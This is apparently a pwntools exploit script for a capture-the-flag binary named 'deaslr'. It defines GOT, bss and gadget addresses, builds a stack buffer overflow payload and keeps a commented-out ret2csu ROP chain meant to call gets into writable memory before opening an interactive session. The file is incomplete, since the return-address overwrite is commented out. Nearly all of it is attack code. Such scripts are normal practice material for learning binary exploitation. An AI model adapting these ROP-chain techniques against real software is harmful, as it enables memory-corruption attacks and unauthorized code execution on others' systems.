from pwn import*
p = process('./deaslr',env={'LD_PRELOAD':'./libc_64.so.6'})

# gadget
gets_got = 0x600FF0
setting = 0x4005B6
run = 0x4005A3
bss = 0x601010+0x50
adc = 0x4004F7
t=0.05

### exploit
pay = 'X'*0x10
pay += 'Y'*0x8          #sfp
pay += 'Z'*0x8
#pay += p64(setting)     #ret

'''
pay += 'X'*0x8          #dummy
pay += p64(0)           #rbx
pay += p64(1)           #rbp    
pay += p64(gets_got)    #r12->call
pay += p64(0)           #r13->rdx
pay += p64(0)           #r14->rsi
pay += p64(bss)        #r15->edi
pay += p64(run)

pay += 'X'*0x8
'''

p.sendline(pay)
sleep(t)




p.interactive()

